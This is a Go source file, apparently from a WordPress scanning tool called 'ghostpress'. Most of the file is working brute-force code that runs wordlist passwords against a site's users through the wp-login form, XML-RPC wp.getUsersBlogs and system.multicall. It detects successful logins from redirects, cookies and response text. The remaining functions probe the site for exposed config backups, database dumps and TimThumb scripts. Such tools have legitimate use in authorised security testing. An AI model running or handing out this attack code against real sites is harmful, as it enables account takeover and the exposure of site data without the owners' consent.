package wp

import (
	"bufio"
	"context"
	"encoding/xml"
	"fmt"
	"os"
	"strings"

	"ghostpress/httpclient"
	"ghostpress/model"
)

type PasswordAttacker interface {
	Name() string
	Try(ctx context.Context, username, password string) (bool, error)
}

func RunPasswordAttack(ctx context.Context, client *httpclient.Client, target *Target, users []model.User, opts model.ScanOptions) []model.PasswordResult {
	if opts.Passwords == "" || len(users) == 0 {
		return nil
	}

	passwords, err := loadWordlist(opts.Passwords)
	if err != nil {
		return nil
	}

	if len(opts.Usernames) > 0 {
		var filtered []model.User
		userSet := make(map[string]bool)
		for _, u := range opts.Usernames {
			userSet[u] = true
		}
		for _, u := range users {
			if userSet[u.Username] {
				filtered = append(filtered, u)
			}
		}
		if len(filtered) > 0 {
			users = filtered
		}
	}

	attacker := selectAttacker(client, target, opts)

	var results []model.PasswordResult

	// breadth-first: try each password against all users before next password
	for _, password := range passwords {
		for _, user := range users {
			select {
			case <-ctx.Done():
				return results
			default:
			}

			success, err := attacker.Try(ctx, user.Username, password)
			if err != nil {
				continue
			}
			if success {
				results = append(results, model.PasswordResult{
					Username: user.Username,
					Password: password,
				})
			}
		}
	}

	return results
}

func selectAttacker(client *httpclient.Client, target *Target, opts model.ScanOptions) PasswordAttacker {
	switch strings.ToLower(opts.PasswordAttack) {
	case "xmlrpc":
		return &xmlrpcAttacker{client: client, target: target}
	case "xmlrpc-multicall":
		return &xmlrpcMulticallAttacker{client: client, target: target}
	default:
		return &wpLoginAttacker{client: client, target: target, loginURI: opts.LoginURI}
	}
}

type wpLoginAttacker struct {
	client      *httpclient.Client
	target      *Target
	loginURI    string
	initialized bool
}

func (a *wpLoginAttacker) Name() string { return "wp-login" }

func (a *wpLoginAttacker) Try(ctx context.Context, username, password string) (bool, error) {
	loginURL := a.target.LoginURL(a.loginURI)

	if !a.initialized {
		a.client.Get(ctx, loginURL)
		a.initialized = true
	}

	postData := fmt.Sprintf("log=%s&pwd=%s&wp-submit=Log+In&redirect_to=%s&testcookie=1",
		username, password, a.target.EffectiveURL+"wp-admin/")

	resp, err := a.client.PostWithCookie(ctx, loginURL, "application/x-www-form-urlencoded",
		[]byte(postData), "wordpress_test_cookie=WP+Cookie+check")
	if err != nil {
		return false, err
	}

	if resp.StatusCode == 302 {
		location := resp.Headers.Get("Location")
		if strings.Contains(location, "wp-admin") {
			return true, nil
		}
	}

	for _, cookies := range resp.Headers["Set-Cookie"] {
		if strings.Contains(cookies, "wordpress_logged_in_") {
			return true, nil
		}
	}

	body := string(resp.Body)
	if !strings.Contains(body, "login_error") && !strings.Contains(body, "Error") &&
		(resp.StatusCode == 200 || resp.StatusCode == 302) {
		if strings.Contains(body, "wp-admin") || strings.Contains(body, "Dashboard") {
			return true, nil
		}
	}

	return false, nil
}

type xmlrpcAttacker struct {
	client *httpclient.Client
	target *Target
}

func (a *xmlrpcAttacker) Name() string { return "xmlrpc" }

func (a *xmlrpcAttacker) Try(ctx context.Context, username, password string) (bool, error) {
	body := fmt.Sprintf(`<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>%s</string></value></param>
    <param><value><string>%s</string></value></param>
  </params>
</methodCall>`, xmlEscape(username), xmlEscape(password))

	resp, err := a.client.Post(ctx, a.target.XMLRPCURL(), "text/xml", []byte(body))
	if err != nil {
		return false, err
	}

	respBody := string(resp.Body)

	if strings.Contains(respBody, "<name>isAdmin</name>") ||
		strings.Contains(respBody, "<name>blogid</name>") {
		return true, nil
	}

	return false, nil
}

type xmlrpcMulticallAttacker struct {
	client   *httpclient.Client
	target   *Target
}

func (a *xmlrpcMulticallAttacker) Name() string { return "xmlrpc-multicall" }

func (a *xmlrpcMulticallAttacker) Try(ctx context.Context, username, password string) (bool, error) {
	body := fmt.Sprintf(`<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value><string>%s</string></value>
                        <value><string>%s</string></value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>`, xmlEscape(username), xmlEscape(password))

	resp, err := a.client.Post(ctx, a.target.XMLRPCURL(), "text/xml", []byte(body))
	if err != nil {
		return false, err
	}

	respBody := string(resp.Body)

	if strings.Contains(respBody, "faultCode") &&
		(strings.Contains(respBody, "Incorrect username") || strings.Contains(respBody, "403")) {
		return false, nil
	}

	if strings.Contains(respBody, "<name>isAdmin</name>") ||
		strings.Contains(respBody, "<name>blogid</name>") {
		return true, nil
	}

	return false, nil
}

func xmlEscape(s string) string {
	var b strings.Builder
	if err := xml.EscapeText(&b, []byte(s)); err != nil {
		return s
	}
	return b.String()
}

func loadWordlist(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var words []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			words = append(words, line)
		}
	}
	return words, scanner.Err()
}

func CheckConfigBackups(ctx context.Context, client *httpclient.Client, target *Target, filenames []string) []string {
	var found []string
	urls := make([]string, len(filenames))
	for i, f := range filenames {
		urls[i] = target.EffectiveURL + f
	}

	results := client.BulkGet(ctx, urls)
	for i, r := range results {
		if r.Error != nil || r.Response == nil {
			continue
		}
		if r.Response.StatusCode != 200 || target.IsSoft404(r.Response) {
			continue
		}
		ct := r.Response.Headers.Get("Content-Type")
		if strings.Contains(ct, "text/html") {
			continue
		}
		found = append(found, urls[i])
	}
	return found
}

func CheckDBExports(ctx context.Context, client *httpclient.Client, target *Target, paths []string) []string {
	var found []string
	urls := make([]string, len(paths))
	for i, p := range paths {
		urls[i] = target.EffectiveURL + p
	}

	results := client.BulkGet(ctx, urls)
	for i, r := range results {
		if r.Error != nil || r.Response == nil {
			continue
		}
		if r.Response.StatusCode != 200 || target.IsSoft404(r.Response) {
			continue
		}
		body := string(r.Response.Body)
		if strings.Contains(body, "CREATE TABLE") || strings.Contains(body, "INSERT INTO") ||
			strings.Contains(body, "DROP TABLE") || strings.Contains(body, "MySQL dump") {
			found = append(found, urls[i])
		}
	}
	return found
}

func CheckTimThumbs(ctx context.Context, client *httpclient.Client, target *Target, paths []string) []string {
	var found []string
	urls := make([]string, len(paths))
	for i, p := range paths {
		urls[i] = target.EffectiveURL + p
	}

	results := client.BulkGet(ctx, urls)
	for i, r := range results {
		if r.Error != nil || r.Response == nil {
			continue
		}
		if r.Response.StatusCode != 200 || target.IsSoft404(r.Response) {
			continue
		}
		ct := r.Response.Headers.Get("Content-Type")
		if strings.Contains(ct, "text/html") {
			continue
		}
		found = append(found, urls[i])
	}
	return found
}
